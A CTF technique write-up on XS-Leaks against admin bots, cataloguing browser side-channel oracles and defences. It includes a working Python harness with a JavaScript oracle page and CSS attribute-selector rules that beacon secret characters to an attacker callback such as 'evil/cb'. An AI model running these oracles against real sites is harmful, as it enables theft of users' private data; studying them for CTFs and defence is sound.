---
title: "XS-Leaks - Browser Side-Channel Oracles in Admin-Bot Challenges"
category: web
subcategory: xsleaks
type: technique
tags: [xsleaks, cross-site-leaks, admin-bot, oracle, frame-counting, window-open, error-events, cache-probing, timing-attack, css-exfiltration, csp, coop, corp, headless-chrome, same-origin-policy, samesite]
difficulty: hard
summary: "A headless bot holds the flag behind SOP; build a boolean oracle (frame count, error event, timing, cache, CSS selector) and binary-search the secret character by character."
when_to_use:
  - "A 'report to admin' bot visits your URL with the flag in its cookie/localStorage/an internal page"
  - "SOP blocks reading the response, but you can observe a side effect (framing, timing, errors)"
  - "A search/profile page behaves differently for a hit vs a miss (a 1-bit oracle)"
  - "CSS injection is possible on a page that renders the secret in an attribute/text"
tools: [python3, headless-chrome, burp]
related: [node-cors-postmessage-websocket, race-conditions, cache-poisoning-deception, jwt-attacks-full]
---

## TL;DR

The admin bot has the secret; the Same-Origin Policy stops you reading cross-origin responses.
XS-Leaks turn an observable *difference* (does the page have 2 frames or 3? did the image load
or error? was the response fast or slow?) into a yes/no oracle, and you binary-search the flag
one character at a time from your attacker page that the bot visits.

## Recognise it

- A challenge with a bot that "visits your link" while authenticated / holding the flag.
- The flag is in a cookie (`SameSite`?), `localStorage`, or an internal page only the bot reaches.
- A page whose behaviour depends on secret-derived state: a search that returns 0 vs 1 results,
  a profile that redirects vs renders, a count of items, a conditional `<iframe>`.
- CSP/COOP/CORP headers (or their absence) that enable/disable specific oracles.

## Theory

### The oracle-and-search model

You need a **boolean oracle**: a cross-origin observation that differs for "secret starts with
`a`" vs not. Then, for a charset of size k, each query resolves ~log2(k) bits; a prefix search
(`flag{a...`, `flag{b...`) recovers the flag character by character. The bot runs your JS, so
you deliver an attacker page that opens/frames the target, measures the oracle, and beacons the
result back.

### Oracle catalogue

- **Frame counting**: `win = window.open(url)` (or an `<iframe>`), then read
  `win.frames.length` / `win.length`. If the target page conditionally renders an `<iframe>`
  (e.g. "1 search result" embeds a widget), the count leaks the condition. Cross-origin
  `window.length` is readable.
- **Error events**: `<img>/<script>/<link>/<object>` fire `onload` vs `onerror` depending on
  status code / content type. A 200 vs 404, or an HTML vs image response, is a bit.
- **Status-code / redirect detection**: `fetch(url, {redirect:'manual'})` -> `response.type ===
  'opaqueredirect'`; `Response.redirected`; `history.length` change after `window.open`; a
  navigation-timing entry appearing or not.
- **Framing (XFO/CSP)**: if the target sets `X-Frame-Options`/`frame-ancestors` only on some
  pages, whether an `<iframe>` loads (its `onload` fires) leaks which page it was.
- **CSP violation report**: force a navigation whose redirect target violates a `script-src`
  you control via a `report-uri`/`report-to` -> the report tells you the redirect happened.
- **Cache probing**: `fetch(resource, {cache:'force-cache'})` + `AbortController` timing --
  a cached resource returns fast, telling you the victim previously loaded it (i.e. visited a
  secret-dependent page).
- **Resource timing**: `performance.getEntries()` exposes `duration`, and for same-origin or
  TAO-permitted resources `transferSize`/`encodedBodySize` -- a size difference is a bit.
- **Connection-pool exhaustion**: saturate the browser's socket pool, then time a request to the
  target; contention reveals whether the target was slow (secret-dependent work).
- **`:target` / scroll-to-text**: a URL `#frag` that matches an element causes a scroll/`:target`
  CSS change; combined with `Element.scrollTop` or a scroll-triggered request, leaks presence.
- **CSS attribute-selector exfiltration**: inject CSS on a page that renders the secret;
  `input[value^="a"]{background:url(//evil/a)}` fires a request iff the value starts with `a`.
  Chain lazy-loaded `@import`s to leak character by character.
- **Media/`<embed>` type oracles**, `document.hasStorageAccess`, and `SharedArrayBuffer` +
  `performance.now()` high-resolution timers where available.

### Delivery mechanics

- **`SameSite=Lax` cookies** are sent on top-level GET navigations (so `window.open`/link works)
  but NOT on cross-site subresource requests (so `fetch`/`<img>` do not carry the cookie). Choose
  the oracle accordingly: for Lax, drive the target via `window.open`, not `fetch`.
- The attacker page loops: open/frame the target with the next guess, measure, beacon the bit,
  advance the prefix.
- **Defences**: `Cross-Origin-Opener-Policy` (breaks `window.open` handle + `frames.length`),
  `Cross-Origin-Resource-Policy` (breaks subresource inclusion), `Cross-Origin-Embedder-Policy`,
  `SameSite=Strict`, and Chrome's cache partitioning (breaks cross-site cache probing).

## Attack

1. Identify a secret-dependent behaviour on the target that produces a 1-bit difference.
2. Pick an oracle compatible with the headers and cookie `SameSite`.
3. Build an attacker page that, per guess, drives the target and measures the oracle.
4. Beacon each bit to your server; reassemble via prefix search.
5. Get the bot to visit your page; collect the flag.

## Code

```python
#!/usr/bin/env python3
"""XS-Leaks harness server + flag reassembly.

Serves a templated oracle page to the bot, collects exfiltrated characters at
a callback endpoint, and reassembles the flag via prefix search. The __main__
self-test drives the reassembly logic and the templating offline (no browser).
"""
from __future__ import annotations

import http.server
import string
import sys
import threading
import urllib.parse

CHARSET = string.ascii_lowercase + string.digits + "_{}-"

# A CSS-injection oracle page: each candidate char emits a background-url probe
# that only fires when the secret input's value starts with prefix+char.
CSS_ORACLE = """<!doctype html><style>
{rules}
</style>
<p>place this CSS on the target via injection; each match beacons a char</p>"""

# A frame-counting / window.open oracle the bot runs directly.
JS_ORACLE = """<!doctype html><script>
const TARGET = "{target}";
const CB = "{callback}";
const CHARSET = {charset};
async function leak(prefix) {{
  for (const c of CHARSET) {{
    const w = window.open(TARGET + "?q=" + encodeURIComponent(prefix + c));
    await new Promise(r => setTimeout(r, 400));
    // secret-dependent condition: e.g. a search hit renders one <iframe>
    const hit = w.length > 0;
    w.close();
    if (hit) {{ navigator.sendBeacon(CB + "?c=" + encodeURIComponent(c)); return c; }}
  }}
  return null;
}}
(async () => {{
  let flag = "flag{{";
  for (let i = 0; i < 40; i++) {{
    const c = await leak(flag);
    if (c === null || c === "}}") break;
    flag += c;
  }}
  navigator.sendBeacon(CB + "?done=" + encodeURIComponent(flag));
}})();
</script>"""


def css_rules(prefix: str, callback: str, field: str = "input[name=secret]",
              charset: str = CHARSET) -> str:
    """One attribute-selector rule per candidate character."""
    rules = []
    for c in charset:
        # ^= means "value starts with"; url() fires the request on match
        rules.append('%s[value^="%s%s"]{background:url("%s?c=%s")}'
                     % (field, prefix, c, callback, urllib.parse.quote(c)))
    return "\n".join(rules)


def build_css_page(prefix: str, callback: str) -> str:
    return CSS_ORACLE.format(rules=css_rules(prefix, callback))


def build_js_page(target: str, callback: str, charset: str = CHARSET) -> str:
    return JS_ORACLE.format(target=target, callback=callback,
                            charset=list(charset))


class FlagReassembler:
    """Collects one character per successful oracle hit, in order."""

    def __init__(self, prefix: str = "flag{", terminator: str = "}") -> None:
        self.chars: list[str] = []
        self.prefix = prefix
        self.terminator = terminator
        self.done = False

    def feed(self, ch: str) -> None:
        if self.done:
            return
        if ch == self.terminator:
            self.done = True
            return
        self.chars.append(ch)

    def flag(self) -> str:
        return self.prefix + "".join(self.chars) + (self.terminator
                                                    if self.done else "")


class _Handler(http.server.BaseHTTPRequestHandler):
    reasm: FlagReassembler = FlagReassembler()
    page: str = ""

    def do_GET(self):  # noqa: N802
        q = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(q.query)
        if q.path == "/cb":
            if "c" in params:
                _Handler.reasm.feed(params["c"][0])
            self.send_response(204)
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(_Handler.page.encode())

    def log_message(self, *a):
        pass


def serve(page: str, reasm: FlagReassembler,
          host: str = "127.0.0.1", port: int = 0):
    _Handler.page = page
    _Handler.reasm = reasm
    srv = http.server.HTTPServer((host, port), _Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]


def _self_test() -> None:
    # CSS rules: one per char, each a starts-with selector with a beacon url
    rules = css_rules("fl", "https://evil/cb")
    assert rules.count("background:url") == len(CHARSET)
    assert '[value^="fla"]' in rules
    assert "https://evil/cb?c=a" in rules

    # page templating
    css_page = build_css_page("flag{", "https://evil/cb")
    assert "url(" in css_page and 'value^="flag{a"' in css_page
    js_page = build_js_page("https://target/search", "https://evil/cb")
    assert "window.open" in js_page and "https://target/search" in js_page
    assert "sendBeacon" in js_page

    # reassembly: feed the characters of a flag in order
    r = FlagReassembler()
    for ch in "s3cr3t_x5":
        r.feed(ch)
    assert not r.done
    assert r.flag() == "flag{s3cr3t_x5"
    r.feed("}")
    assert r.done and r.flag() == "flag{s3cr3t_x5}"
    # feeding after done is ignored
    r.feed("z")
    assert r.flag() == "flag{s3cr3t_x5}"

    # the harness server serves the page and records callback hits
    reasm = FlagReassembler()
    srv, port = serve(css_page, reasm)
    try:
        import urllib.request
        got = urllib.request.urlopen("http://127.0.0.1:%d/" % port,
                                     timeout=5).read().decode()
        assert "background:url" in got
        for ch in "abc":
            urllib.request.urlopen("http://127.0.0.1:%d/cb?c=%s" % (port, ch),
                                   timeout=5).read()
        assert reasm.flag() == "flag{abc"
    finally:
        srv.shutdown()

    print("[ok] CSS+JS oracle templating, reassembly and harness server verified")


if __name__ == "__main__":
    if len(sys.argv) >= 3:
        print(build_js_page(sys.argv[1], sys.argv[2]))
    else:
        _self_test()
```

## Variants & pitfalls

- **Pick the oracle to match the headers.** COOP kills `window.open`/`frames.length`; CORP kills
  subresource inclusion; a strong CSP may block your report trick. Enumerate the target's
  response headers first.
- **`SameSite` decides delivery.** Lax cookies ride top-level navigations (`window.open`, links)
  but not `fetch`/`<img>` subresources; Strict blocks both cross-site -- then you need a
  same-site foothold (an open redirect on the target, a subdomain).
- **Timing oracles are noisy** -- average many samples, use a control, and prefer a
  deterministic oracle (frame count, error event) when available.
- **Chrome cache partitioning** (since ~2020) breaks naive cross-site cache probing; the
  partition key includes the top-level site.
- **CSS exfil needs sequential `@import`/lazy backgrounds** to enforce ordering; browsers may
  fetch all `url()`s in parallel, so a single-shot attribute selector only leaks *one* known
  position -- chain prefixes across page loads.
- **Bot timing**: headless bots often close the tab after N seconds; keep each guess fast and
  beacon early.
- **`window.open` popup blockers**: trigger from a user-gesture-like context, or use iframes
  where the oracle allows.
- **Prove per-character determinism**: a flaky oracle corrupts the search; verify a known prefix
  (`flag{`) resolves before trusting the tail.

## Tools

- The XS-Leaks Wiki (oracle catalogue and per-browser support matrix).
- A local headless Chrome to model the bot and test your oracle end-to-end.
- Burp Collaborator / your own beacon server for out-of-band bits.
- The harness above for the server + reassembly plumbing.

## References

- XS-Leaks Wiki -- oracle techniques and defences.
- terjanq et al. -- cross-site leaks research and challenge writeups.
- MDN -- `Window.length`/`frames`, `PerformanceResourceTiming`, COOP/COEP/CORP, SameSite cookies.
- d0nut -- CSS-based data exfiltration writeups.
